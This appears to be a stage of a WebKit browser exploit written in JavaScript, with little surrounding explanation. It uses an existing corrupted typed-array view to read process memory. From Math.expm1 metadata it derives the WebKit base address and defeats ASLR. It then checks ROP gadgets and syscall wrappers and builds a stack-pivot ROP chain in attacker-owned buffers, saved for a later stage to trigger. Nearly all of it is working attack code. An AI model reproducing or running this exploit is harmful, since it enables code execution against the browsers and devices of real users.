// Derive a current-process WebKit base from the live Math.expm1 metadata,
// Construct and verify an owned-buffer native-call plan from current-process
// pointers. This probe does not arm the callable or execute the plan.
var state = window.__fw14ArrayState;
var result;
var phase = "preflight";
var slot = -1;
var original = [];
var viewChanged = false;
try {
  if (!state || !state.view || !state.array || !state.a ||
      !state.addressAnchor || !state.calibratedViewBase ||
      !state.ownedTypedView ||
      !state.otherTypedView || state.array[0] !== state.a ||
      state.addressAnchor.marker !== 0x11223344)
    throw new Error("held_views_preflight_failed");
  var forged = state.view;
  var a = state.ownedTypedView;
  var b = state.otherTypedView;
  if (a.length !== 65536 || b.length !== 65536 ||
      a[0] !== 0x31 || a[7] !== 0xa8 || b[0] !== 0x42)
    throw new Error("owned_canary_mismatch");
  function matches(at, value) {
    return forged[at] === (value & 255) &&
      forged[at + 1] === (value >>> 8 & 255) &&
      forged[at + 2] === (value >>> 16 & 255) &&
      forged[at + 3] === (value >>> 24 & 255);
  }
  function bytesAt(at) {
    var bytes = [];
    for (var n = 0; n < 8; n++) bytes.push(forged[at + n]);
    return bytes;
  }
  function hexLE(bytes) {
    var out = "0x";
    for (var n = bytes.length - 1; n >= 0; n--)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function hexForward(bytes) {
    var out = "";
    for (var n = 0; n < bytes.length; n++)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function wordOf(value) {
    var bytes = [];
    try {
      state.array[0] = value;
      for (var n = 0; n < 8; n++) bytes.push(forged[state.index + n]);
    } finally {
      state.array[0] = state.a;
    }
    return hexLE(bytes);
  }
  var base = state.calibratedViewBase;
  var anchorIndex = Number(wordOf(state.addressAnchor)) + 8 - base;
  if (!Number.isSafeInteger(base) || base % 4096 !== 0 ||
      !Number.isSafeInteger(anchorIndex) || anchorIndex < 0 ||
      anchorIndex + 3 >= 2097152 ||
      !matches(anchorIndex, 0x11223344))
    throw new Error("cached_anchor_gate_failed");
  var live = false;
  try {
    state.addressAnchor.marker = 0x55667788;
    live = matches(anchorIndex, 0x55667788);
  } finally {
    state.addressAnchor.marker = 0x11223344;
  }
  if (!live || !matches(anchorIndex, 0x11223344))
    throw new Error("cached_anchor_not_live");
  phase = "pointer_gate";
  var aWord = wordOf(a);
  var aIndex = Number(aWord) - base;
  var expWord = wordOf(Math.expm1);
  if (!Number.isSafeInteger(aIndex) || aIndex < 0 ||
      aIndex + 15 >= 16777216 ||
      !Number.isSafeInteger(Number(expWord)) ||
      Number(expWord) < 0x200000000)
    throw new Error("cells_outside_window_a" + aWord + "_exp" + expWord);
  slot = aIndex + 8;
  original = bytesAt(slot);
  var bIndex = Number(wordOf(b)) - base;
  if (!Number.isSafeInteger(bIndex) || bIndex < 0 ||
      bIndex + 15 >= 16777216)
    throw new Error("other_cell_outside_window");
  var otherData = bytesAt(bIndex + 8);
  if (Number(hexLE(otherData)) - Number(hexLE(original)) !== 65536)
    throw new Error("owned_data_spacing_mismatch");
  function readAddress(address, count) {
    if (!Number.isSafeInteger(address) || address <= 0 ||
        count < 1 || count > 64)
      throw new Error("invalid_read_target");
    var pointerBytes = [];
    for (var n = 0; n < 8; n++)
      pointerBytes.push(Math.floor(address / Math.pow(2, n * 8)) & 255);
    var bytes = [];
    viewChanged = true;
    try {
      for (var w = 0; w < 8; w++) forged[slot + w] = pointerBytes[w];
      for (var r = 0; r < count; r++) bytes.push(a[r]);
    } finally {
      for (var x = 0; x < 8; x++) forged[slot + x] = original[x];
      viewChanged = false;
    }
    return bytes;
  }
  var metadataPointer = Number(hexLE(readAddress(Number(expWord) + 16, 8)));
  if (!Number.isSafeInteger(metadataPointer) || metadataPointer <= 0 ||
      metadataPointer >= base || metadataPointer % 8 !== 0)
    throw new Error("metadata_pointer_gate_failed");
  if (api && typeof api.markSync === "function")
    api.markSync("gadget_metadata_before_read");
  phase = "metadata";
  var metadata = readAddress(metadataPointer, 64);
  var codePtr = 0;
  for (var k = 7; k >= 0; k--)
    codePtr = codePtr * 256 + metadata[40 + k];
  var webkitBase = codePtr - 0x2586880;
  if (!Number.isSafeInteger(codePtr) || codePtr < 0x800000000 ||
      !Number.isSafeInteger(webkitBase) || webkitBase <= 0 ||
      webkitBase % 0x4000 !== 0) {
    var expCell = readAddress(Number(expWord), 64);
    var cellP8 = Number(hexLE(expCell.slice(8, 16)));
    var cellP24 = Number(hexLE(expCell.slice(24, 32)));
    if (!Number.isSafeInteger(cellP8) || !Number.isSafeInteger(cellP24) ||
        cellP8 < 0x200000000 || cellP8 >= 0x300000000 ||
        cellP24 < 0x200000000 || cellP24 >= 0x300000000)
      throw new Error("cell_candidate_pointers_invalid");
    var cellP8Bytes = readAddress(cellP8, 64);
    var cellP24Bytes = readAddress(cellP24, 64);
    result = { id: "native_metadata_diag_v2", status: "pass", details: {
      exp_word: expWord,
      p8: "0x" + cellP8.toString(16),
      p16: "0x" + metadataPointer.toString(16),
      p24: "0x" + cellP24.toString(16),
      p8_hex: hexForward(cellP8Bytes),
      p16_hex: hexForward(metadata),
      p24_hex: hexForward(cellP24Bytes),
      view_restored: hexLE(bytesAt(slot)) === hexLE(original) &&
        a[0] === 0x31 && a[7] === 0xa8
    } };
    return [result];
  }
  if (api && typeof api.markSync === "function")
    api.markSync("gadget_candidate_base_ready");
  phase = "gadget_reads";
  var specs = [
    ["G0", 0x295f948, "488b7e30488b07ff10"],
    ["G1", 0x1d989e3, "58488b07ff6018"],
    ["G2", 0x25bae0, "554889e5488b07ff5010"],
    ["G3", 0x4a0406, "488b7808488b07ff5020"],
    ["G4", 0x1ec3ada, "488b5038488b07ff5010"],
    ["G5", 0x2abccaa, "525cc3"],
    ["POP_RCX", 0x1bade, "59c3"],
    ["POP_RAX", 0x10504, "58c3"],
    ["POP_R8", 0x9b311, "?58c3"],
    ["POP_R9", 0x1dcfb1, "?59c3"],
    ["LEAVE", 0x182f7, "c9c3"],
    ["STORE_RAX", 0x548b, "488907c3"],
    ["POP_RDI", 0x5c480, "5fc3"],
    ["POP_RSI", 0x6e45e, "5ec3"],
    ["POP_RDX", 0x12c5ba, "5ac3"]
  ];
  var groups = [[], [], []];
  var matched = 0;
  var stable = true;
  for (var s = 0; s < specs.length; s++) {
    var spec = specs[s];
    var first = hexForward(readAddress(webkitBase + spec[1], spec[2].length / 2));
    var second = hexForward(readAddress(webkitBase + spec[1], spec[2].length / 2));
    if (first !== second) stable = false;
    var expected = spec[2];
    var ok = expected[0] === "?" ?
      parseInt(first.slice(0, 2), 16) >= 0x41 &&
      parseInt(first.slice(0, 2), 16) <= 0x4f &&
      first.slice(2) === expected.slice(1) : first === expected;
    if (ok) matched++;
    groups[s < 6 ? 0 : s < 12 ? 1 : 2].push(spec[0] + ":" + first);
  }
  var allMatched = matched === specs.length;
  if (!allMatched || !stable)
    throw new Error("current_process_gadget_gate_failed_" + matched);
  phase = "import_slots";
  var firstImportBytes = readAddress(webkitBase + 0x3cb8cc8, 8);
  var secondImportBytes = readAddress(webkitBase + 0x3cb9c00, 8);
  var firstImport = Number(hexLE(firstImportBytes));
  var secondImport = Number(hexLE(secondImportBytes));
  if (!Number.isSafeInteger(firstImport) ||
      !Number.isSafeInteger(secondImport) ||
      firstImport < 0x800000000 || firstImport >= 0x900000000 ||
      secondImport < 0x800000000 || secondImport >= 0x900000000 ||
      firstImport - secondImport !== 0x49a0)
    throw new Error("current_import_pair_gate_failed");
  phase = "import_targets";
  var firstCode = hexForward(readAddress(firstImport, 16));
  var firstCodeAgain = hexForward(readAddress(firstImport, 16));
  var secondCode = hexForward(readAddress(secondImport, 16));
  var secondCodeAgain = hexForward(readAddress(secondImport, 16));
  var importCodeMatched = firstCode === firstCodeAgain &&
    secondCode === secondCodeAgain &&
    firstCode.slice(0, 14) === "554889e5488b05" &&
    secondCode.slice(0, 16) === "554889e54531c0e8";
  if (!importCodeMatched)
    throw new Error("current_import_code_gate_failed");
  phase = "wrapper_bytes";
  var wrapper456 = hexForward(readAddress(firstImport + 0x6750, 16));
  var wrapper456Again = hexForward(readAddress(firstImport + 0x6750, 16));
  var wrapper20 = hexForward(readAddress(firstImport + 0x6cf0, 16));
  var wrapper20Again = hexForward(readAddress(firstImport + 0x6cf0, 16));
  var wrappersMatched = wrapper456 === wrapper456Again &&
    wrapper20 === wrapper20Again &&
    wrapper456 === "48c7c0c80100004989ca0f057201c348" &&
    wrapper20 === "48c7c0140000004989ca0f057201c348";
  if (!wrappersMatched)
    throw new Error("current_wrapper_gate_failed");
  phase = "owned_layout";
  var store = new Uint8Array(65536);
  var pivot = new Uint8Array(65536);
  var stack = new Uint8Array(65536);
  var frame = new Uint8Array(65536);
  var pivotObject = {};
  function dataOf(view) {
    var cellIndex = Number(wordOf(view)) - base;
    if (!Number.isSafeInteger(cellIndex) || cellIndex < 0 ||
        cellIndex + 15 >= 16777216)
      throw new Error("owned_typed_cell_outside_window");
    var data = Number(hexLE(bytesAt(cellIndex + 8)));
    if (!Number.isSafeInteger(data) || data <= 0 || data % 8 !== 0)
      throw new Error("owned_data_pointer_invalid");
    return data;
  }
  var addresses = {
    store: dataOf(store), pivot: dataOf(pivot),
    stack: dataOf(stack), frame: dataOf(frame)
  };
  var keys = ["store", "pivot", "stack", "frame"];
  var lengths = [store.length, pivot.length, stack.length, frame.length];
  for (var u = 0; u < keys.length; u++)
    for (var v = u + 1; v < keys.length; v++)
      if (addresses[keys[u]] < addresses[keys[v]] + lengths[v] &&
          addresses[keys[v]] < addresses[keys[u]] + lengths[u])
        throw new Error("owned_data_ranges_overlap");
  var pivotCell = Number(wordOf(pivotObject));
  if (!Number.isSafeInteger(pivotCell) ||
      pivotCell < 0x200000000 || pivotCell >= 0x300000000 ||
      pivotCell % 8 !== 0)
    throw new Error("pivot_cell_word_invalid");
  var pivotHeader = readAddress(pivotCell, 8);
  if (pivotHeader[7] > 2)
    throw new Error("pivot_cell_state_unexpected");
  var functionSlot = metadataPointer + 40;
  if (hexLE(readAddress(functionSlot, 8)) !== hexLE(metadata.slice(40, 48)))
    throw new Error("function_slot_changed");
  function put(view, at, value) {
    view.setUint32(at, value >>> 0, true);
    view.setUint32(at + 4, Math.floor(value / 4294967296) >>> 0, true);
  }
  var storeView = new DataView(store.buffer);
  var pivotView = new DataView(pivot.buffer);
  var stackView = new DataView(stack.buffer);
  put(storeView, 0, webkitBase + 0x1d989e3);
  put(storeView, 8, addresses.pivot);
  put(storeView, 0x10, webkitBase + 0x4a0406);
  put(storeView, 0x18, webkitBase + 0x25bae0);
  put(pivotView, 0, addresses.pivot);
  put(pivotView, 0x10, webkitBase + 0x2abccaa);
  put(pivotView, 0x20, webkitBase + 0x1ec3ada);
  var chain = [firstImport + 0x6cf0, webkitBase + 0x5c480,
    addresses.frame, webkitBase + 0x548b,
    webkitBase + 0x10504, 0, webkitBase + 0x182f7];
  var stackOffset = 0x2000 - chain.length * 8;
  if ((addresses.stack + stackOffset) % 16 !== 0) stackOffset -= 8;
  if (stackOffset < 0 || stackOffset + chain.length * 8 > 0x2000)
    throw new Error("stack_chain_outside_owned_allocation");
  for (var z = 0; z < chain.length; z++) {
    if (z === 5) {
      stackView.setUint32(stackOffset + z * 8, 0x0a, true);
      stackView.setUint32(stackOffset + z * 8 + 4, 0xfffffff7, true);
    } else put(stackView, stackOffset + z * 8, chain[z]);
  }
  put(pivotView, 0x38, addresses.stack + stackOffset);
  phase = "owned_contents";
  function sameAt(address, expected) {
    var actual = readAddress(address, expected.length);
    for (var t = 0; t < expected.length; t++)
      if (actual[t] !== expected[t]) return false;
    return true;
  }
  var storeMatched = sameAt(addresses.store, store.subarray(0, 32));
  var pivotMatched = sameAt(addresses.pivot, pivot.subarray(0, 64));
  var stackMatched = sameAt(addresses.stack + stackOffset,
    stack.subarray(stackOffset, stackOffset + chain.length * 8));
  var frameMatched = sameAt(addresses.frame, frame.subarray(0, 8));
  var contentsMatched = storeMatched && pivotMatched &&
    stackMatched && frameMatched;
  if (!contentsMatched)
    throw new Error("owned_contents_mismatch_" +
      Number(storeMatched) + Number(pivotMatched) +
      Number(stackMatched) + Number(frameMatched) + "_s" +
      hexForward(readAddress(addresses.store, 16)) + "/" +
      hexForward(store.subarray(0, 16)) + "_p" +
      hexForward(readAddress(addresses.pivot, 16)) + "/" +
      hexForward(pivot.subarray(0, 16)));
  window.__fw14NativePlan = {
    store: store, pivot: pivot, stack: stack, frame: frame,
    pivotObject: pivotObject, pivotCell: pivotCell,
    pivotHeader: pivotHeader, functionSlot: functionSlot,
    originalFunctionSlot: metadata.slice(40, 48),
    addresses: addresses, stackOffset: stackOffset,
    target: firstImport + 0x6cf0, webkitBase: webkitBase,
    sourceSession: "current_page"
  };
  var restored = hexLE(bytesAt(slot)) === hexLE(original) &&
    a[0] === 0x31 && a[7] === 0xa8 && b[0] === 0x42 &&
    state.array[0] === state.a;
  if (api && typeof api.markSync === "function")
    api.markSync("gadget_reads_restored");
  result = { id: "native_metadata_diag_v2",
    status: allMatched && stable && importCodeMatched &&
      wrappersMatched && contentsMatched && restored ? "pass" : "fail",
    details: { view_base: "0x" + base.toString(16),
      webkit_base: "0x" + webkitBase.toString(16),
      matched_count: matched,
      target: "0x" + (firstImport + 0x6cf0).toString(16),
      function_slot: "0x" + functionSlot.toString(16),
      pivot_cell: "0x" + pivotCell.toString(16),
      store_data: "0x" + addresses.store.toString(16),
      pivot_data: "0x" + addresses.pivot.toString(16),
      stack_data: "0x" + addresses.stack.toString(16),
      frame_data: "0x" + addresses.frame.toString(16),
      stack_offset: stackOffset,
      view_restored: restored } };
} catch (error) {
  if (viewChanged && state && state.view && original.length === 8 && slot >= 0)
    for (var y = 0; y < 8; y++) state.view[slot + y] = original[y];
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "native_metadata_diag_v2", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
return [result];
